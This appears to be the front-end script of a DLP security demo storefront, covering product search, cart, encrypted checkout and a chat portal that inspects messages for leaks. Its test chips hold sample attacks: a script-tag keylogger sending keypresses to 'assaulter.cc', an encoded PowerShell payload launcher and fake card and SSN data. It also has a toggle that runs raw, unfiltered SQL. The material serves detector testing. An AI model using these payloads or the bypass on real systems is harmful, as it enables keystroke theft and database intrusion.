/**
 * Storefront Controller - Products, Cart, Checkout with AESX, and Chat Leak Portal
 */

const Store = {
  products: [],
  cart: [],
  typingStartTime: null,
  keyStrokeIntervals: [],

  init() {
    this.fetchProducts();
    this.setupSearch();
    this.setupCart();
    this.setupCheckout();
    this.setupChatPortal();
    this.setupKeystrokeMonitor();
  },

  // Fetch product catalog
  async fetchProducts() {
    const catalogStatus = document.getElementById('catalog-status');
    try {
      const res = await fetch('/api/products');
      const data = await res.json();
      if (data.success) {
        this.products = data.products;
        this.renderProducts(this.products);
        if (catalogStatus) catalogStatus.textContent = `${this.products.length} Products Loaded`;
      }
    } catch (err) {
      if (catalogStatus) catalogStatus.textContent = 'Error loading products';
    }
  },

  // Render product grid
  renderProducts(products) {
    const grid = document.getElementById('product-grid');
    if (!grid) return;

    if (!products || products.length === 0) {
      grid.innerHTML = `
        <div style="grid-column: 1/-1; text-align: center; padding: 3rem; background: var(--bg-card); border-radius: var(--radius-md); border: 1px dashed var(--border-subtle);">
          <p style="color: var(--text-muted); font-size: 1rem;">No products match your query.</p>
        </div>
      `;
      return;
    }

    grid.innerHTML = products.map(p => `
      <div class="product-card">
        <div class="product-image-wrap">
          <img src="${p.image_url}" alt="${p.name}" loading="lazy">
          <div class="product-badge-overlay">${p.category}</div>
        </div>
        <div class="product-content">
          <h3 class="product-title">${p.name}</h3>
          <p class="product-desc">${p.description}</p>
          <div class="product-footer">
            <span class="product-price">$${p.price.toFixed(2)}</span>
            <button class="btn btn-primary btn-add-cart" data-id="${p.id}" style="padding: 0.45rem 1rem; font-size: 0.82rem;">
              + Add to Cart
            </button>
          </div>
        </div>
      </div>
    `).join('');

    // Attach cart click handlers
    grid.querySelectorAll('.btn-add-cart').forEach(btn => {
      btn.addEventListener('click', () => {
        const id = parseInt(btn.dataset.id, 10);
        this.addToCart(id);
      });
    });
  },

  // Setup Search and Attack Chips
  setupSearch() {
    const searchForm = document.getElementById('search-form');
    const searchInput = document.getElementById('search-input');
    const toggleBypass = document.getElementById('toggle-bypass-dlp');
    const toggleText = document.getElementById('dlp-toggle-text');
    const alertBox = document.getElementById('search-alert-box');

    // Toggle switch text
    toggleBypass.addEventListener('change', () => {
      if (toggleBypass.checked) {
        toggleText.textContent = '⚠️ DLP BYPASSED (Vulnerable Mode)';
        toggleText.style.color = 'var(--rose-danger)';
        App.showToast('Vulnerable Mode Active', 'warning', 'SQL Injection filter is bypassed. Queries execute raw against database!');
      } else {
        toggleText.textContent = 'DLP Shield Active';
        toggleText.style.color = 'var(--emerald-success)';
        App.showToast('DLP Shield Active', 'success', 'All SQL queries are scrutinized by Content Inspection & Contextual Analysis.');
      }
    });

    // Quick Test Chips click
    document.querySelectorAll('.chip[data-query]').forEach(chip => {
      chip.addEventListener('click', () => {
        searchInput.value = chip.dataset.query;
        this.executeSearch(chip.dataset.query);
      });
    });

    // Submit search form
    searchForm.addEventListener('submit', (e) => {
      e.preventDefault();
      this.executeSearch(searchInput.value.trim());
    });
  },

  // Execute Search via API
  async executeSearch(query) {
    const toggleBypass = document.getElementById('toggle-bypass-dlp');
    const alertBox = document.getElementById('search-alert-box');
    const bypassDlp = toggleBypass ? toggleBypass.checked : false;

    // Calculate typing latency
    const typingCadence = this.keyStrokeIntervals.length > 0 
      ? this.keyStrokeIntervals.reduce((a, b) => a + b, 0)
      : 250;

    try {
      const res = await fetch('/api/products/search', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          query,
          bypassDlp,
          typingSpeedMs: typingCadence
        })
      });

      const data = await res.json();

      // Case 1: DLP Intercepted & Blocked
      if (!res.ok || data.blocked) {
        alertBox.style.display = 'block';
        alertBox.innerHTML = `
          <div class="glass-card" style="border-left: 4px solid var(--rose-danger); background: rgba(244, 63, 94, 0.1);">
            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.5rem;">
              <strong style="color: var(--rose-danger); font-size: 1.1rem;">🚨 Query Blocked by Cloud DLP Shield</strong>
              <span class="badge badge-critical">${data.dlpResult?.contentReport?.threatLevel || 'CRITICAL'}</span>
            </div>
            <p style="font-size: 0.9rem; margin-bottom: 0.6rem;">${data.error}</p>
            <div class="code-block" style="font-size: 0.78rem; color: #fca5a5;">
              Rule Matched: ${data.dlpResult?.contentReport?.matches?.map(m => m.ruleName).join(', ') || 'Exploit Pattern'}<br>
              Action Enforced: <strong>${data.dlpResult?.finalAction || 'RESTRICT_USER'}</strong> | Risk Score Delta: +${data.dlpResult?.contentReport?.score || 0}
            </div>
          </div>
        `;
        App.showToast('DLP Security Alert', 'danger', 'SQL Injection attempt detected and blocked!');
        return;
      }

      // Case 2: Honeypot Active
      if (data.isHoneypot) {
        alertBox.style.display = 'block';
        alertBox.innerHTML = `
          <div class="glass-card" style="border-left: 4px solid var(--amber-warning); background: rgba(245, 158, 11, 0.1);">
            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.5rem;">
              <strong style="color: var(--amber-warning); font-size: 1.1rem;">⚠️ Deceptive Honeypot Vault Triggered</strong>
              <span class="badge badge-suspicious">HONEYTOKEN SERVED</span>
            </div>
            <p style="font-size: 0.85rem; color: var(--text-muted);">
              User risk categorized as Assaulter. Synthetic decoy records were returned to mislead the attacker while telemetry is forwarded to the SOC.
            </p>
          </div>
        `;
        this.renderProducts(data.products);
        return;
      }

      // Case 3: Bypassed Mode Raw Query Execution
      if (data.bypassedDlp) {
        alertBox.style.display = 'block';
        alertBox.innerHTML = `
          <div class="glass-card" style="border-left: 4px solid var(--purple-accent); background: rgba(168, 85, 247, 0.1);">
            <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.5rem;">
              <strong style="color: var(--purple-accent); font-size: 1.1rem;">🔓 Raw SQL Executed (Vulnerable Mode Demo)</strong>
              <span class="badge" style="background: rgba(168,85,247,0.2); color:#d8b4fe;">BYPASS ACTIVE</span>
            </div>
            <p style="font-size: 0.82rem; font-family: var(--font-mono); color: #cbd5e1; margin-bottom: 0.4rem;">
              Executed SQL: <code>${data.queryExecuted}</code>
            </p>
            <p style="font-size: 0.8rem; color: var(--text-muted);">
              Notice that without DLP protection, SQL tautologies bypass logic and dump unexpected rows.
            </p>
          </div>
        `;
        this.renderProducts(data.products);
        return;
      }

      // Case 4: Clean Search
      alertBox.style.display = 'none';
      this.renderProducts(data.products);

    } catch (err) {
      alertBox.style.display = 'block';
      alertBox.innerHTML = `
        <div class="glass-card" style="border-left: 4px solid var(--rose-danger);">
          <strong style="color: var(--rose-danger);">Search Error:</strong> ${err.message}
        </div>
      `;
    }
  },

  // Shopping Cart Management
  setupCart() {
    const btnOpenCart = document.getElementById('btn-open-cart');
    const btnCloseCart = document.getElementById('btn-close-cart');
    const drawer = document.getElementById('cart-drawer');

    btnOpenCart.addEventListener('click', () => {
      drawer.classList.add('open');
      this.renderCart();
    });

    btnCloseCart.addEventListener('click', () => {
      drawer.classList.remove('open');
    });
  },

  addToCart(productId) {
    const product = this.products.find(p => p.id === productId);
    if (!product) return;

    const existing = this.cart.find(item => item.id === productId);
    if (existing) {
      existing.quantity += 1;
    } else {
      this.cart.push({ ...product, quantity: 1 });
    }

    this.updateCartBadge();
    App.showToast('Item Added', 'success', `${product.name} added to cart`);
  },

  updateCartBadge() {
    const badge = document.getElementById('cart-count');
    const totalCount = this.cart.reduce((sum, item) => sum + item.quantity, 0);
    if (badge) badge.textContent = totalCount;
  },

  renderCart() {
    const list = document.getElementById('cart-items-list');
    const totalEl = document.getElementById('cart-total-amount');
    if (!list) return;

    if (this.cart.length === 0) {
      list.innerHTML = `
        <div style="text-align: center; color: var(--text-dim); margin-top: 3rem;">
          Your cart is empty.
        </div>
      `;
      if (totalEl) totalEl.textContent = '$0.00';
      return;
    }

    let total = 0;
    list.innerHTML = this.cart.map(item => {
      const subtotal = item.price * item.quantity;
      total += subtotal;
      return `
        <div class="cart-item">
          <div>
            <div style="font-weight: 700; font-size: 0.9rem;">${item.name}</div>
            <div style="color: var(--text-muted); font-size: 0.8rem;">$${item.price.toFixed(2)} &times; ${item.quantity}</div>
          </div>
          <div style="font-weight: 700; font-family: var(--font-mono); color: var(--cyan-primary);">
            $${subtotal.toFixed(2)}
          </div>
        </div>
      `;
    }).join('');

    if (totalEl) totalEl.textContent = `$${total.toFixed(2)}`;
  },

  // Checkout with AESX Field Encryption
  setupCheckout() {
    const btnOpenCheckout = document.getElementById('btn-open-checkout');
    const checkoutModal = document.getElementById('checkout-modal');
    const btnCloseCheckout = document.getElementById('btn-close-checkout');
    const checkoutForm = document.getElementById('checkout-form');
    const drawer = document.getElementById('cart-drawer');

    btnOpenCheckout.addEventListener('click', () => {
      if (this.cart.length === 0) {
        App.showToast('Empty Cart', 'warning', 'Please add items before checkout.');
        return;
      }
      drawer.classList.remove('open');
      checkoutModal.classList.add('active');
    });

    btnCloseCheckout.addEventListener('click', () => {
      checkoutModal.classList.remove('active');
    });

    checkoutForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const customerName = document.getElementById('checkout-name').value;
      const shippingAddress = document.getElementById('checkout-address').value;
      const cardNumber = document.getElementById('checkout-card').value;
      const total = this.cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);

      try {
        const res = await fetch('/api/checkout', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            customerName,
            shippingAddress,
            cardNumber,
            items: this.cart,
            totalAmount: total
          })
        });

        const data = await res.json();
        if (data.success) {
          checkoutModal.classList.remove('active');
          this.cart = [];
          this.updateCartBadge();
          this.renderCart();

          App.showToast(
            'Order Confirmed with AESX!',
            'success',
            `Order #${data.orderId} committed to SQLite vault. Card: ${data.cardMasked}`
          );

          // If SOC is open, refresh vault
          if (window.Vault) window.Vault.fetchVault();
        } else {
          App.showToast('Checkout Blocked', 'danger', data.error);
        }
      } catch (err) {
        App.showToast('Checkout Failed', 'danger', err.message);
      }
    });
  },

  // Customer Chat & Leak Inspection Portal
  setupChatPortal() {
    const chatForm = document.getElementById('chat-form');
    const chatInput = document.getElementById('chat-message-input');
    const resultBox = document.getElementById('chat-result-box');

    // Quick chip buttons
    document.getElementById('chip-chat-benign')?.addEventListener('click', () => {
      chatInput.value = 'Hello, can you please tell me when the Aegis Quantum Router will be back in stock? Thank you!';
    });

    document.getElementById('chip-chat-cc-leak')?.addEventListener('click', () => {
      chatInput.value = 'Here is the customer data dump: Alice Smith SSN: 234-56-7890 Card: 4532718293847561 Exp: 12/28 CVV: 891';
    });

    document.getElementById('chip-chat-keylogger')?.addEventListener('click', () => {
      chatInput.value = '<script>window.addEventListener("keypress", function(e){ fetch("http://assaulter.cc/log?key=" + e.key); });</script>';
    });

    document.getElementById('chip-chat-ransomware')?.addEventListener('click', () => {
      chatInput.value = 'powershell -enc JAB3AGMAYQA9AE4AZQB3AC0ATwBiAGoAZQBjAHQA... cmd.exe /c start payload.exe';
    });

    chatForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const message = chatInput.value.trim();
      if (!message) return;

      try {
        const res = await fetch('/api/messages/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message,
            username: App.state.currentUser.username
          })
        });

        const data = await res.json();
        resultBox.style.display = 'block';

        if (!res.ok || data.blocked) {
          resultBox.innerHTML = `
            <div class="glass-card" style="border-left: 4px solid var(--rose-danger); background: rgba(244, 63, 94, 0.1);">
              <div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 0.4rem;">
                <strong style="color: var(--rose-danger);">🚨 Message Blocked by DLP Engine</strong>
                <span class="badge badge-critical">${data.dlpResult?.contentReport?.threatLevel || 'CRITICAL'}</span>
              </div>
              <p style="font-size: 0.85rem; color: #fca5a5;">${data.error}</p>
              <div class="code-block" style="font-size: 0.75rem; margin-top: 0.5rem;">
                Violation: ${data.dlpResult?.contentReport?.matches?.map(m => m.ruleName).join(', ') || 'Hazardous Payload'}<br>
                Action: <strong>${data.dlpResult?.finalAction}</strong> | User Status: <strong>${data.dlpResult?.contextualReport?.status}</strong>
              </div>
            </div>
          `;
          App.showToast('DLP Leak Intercepted', 'danger', 'Prohibited data or malicious script payload was blocked.');
        } else {
          resultBox.innerHTML = `
            <div class="glass-card" style="border-left: 4px solid var(--emerald-success); background: rgba(16, 185, 129, 0.1);">
              <strong style="color: var(--emerald-success);">✅ Message Clean &amp; Dispatched</strong>
              <p style="font-size: 0.85rem; color: var(--text-muted); margin-top: 0.3rem;">
                Content inspection passed with zero security policy violations.
              </p>
            </div>
          `;
          chatInput.value = '';
          App.showToast('Message Sent', 'success', 'Your inquiry was accepted by customer support.');
        }
      } catch (err) {
        resultBox.style.display = 'block';
        resultBox.innerHTML = `<p style="color: var(--rose-danger);">Error sending message: ${err.message}</p>`;
      }
    });
  },

  // Monitor typing intervals
  setupKeystrokeMonitor() {
    const input = document.getElementById('search-input');
    const chatInput = document.getElementById('chat-message-input');
    const cadenceEl = document.getElementById('chat-typing-speed');

    let lastTime = Date.now();

    const recordStroke = () => {
      const now = Date.now();
      const interval = now - lastTime;
      lastTime = now;
      this.keyStrokeIntervals.push(interval);
      if (this.keyStrokeIntervals.length > 20) this.keyStrokeIntervals.shift();

      const avg = Math.round(this.keyStrokeIntervals.reduce((a, b) => a + b, 0) / this.keyStrokeIntervals.length);
      if (cadenceEl) {
        cadenceEl.textContent = `Typing Cadence: ${avg}ms/keystroke (${avg < 25 ? 'Bot/Replay' : 'Human Normal'})`;
        cadenceEl.style.color = avg < 25 ? 'var(--amber-warning)' : 'var(--emerald-success)';
      }
    };

    if (input) input.addEventListener('keydown', recordStroke);
    if (chatInput) chatInput.addEventListener('keydown', recordStroke);
  }
};

window.addEventListener('DOMContentLoaded', () => {
  Store.init();
});
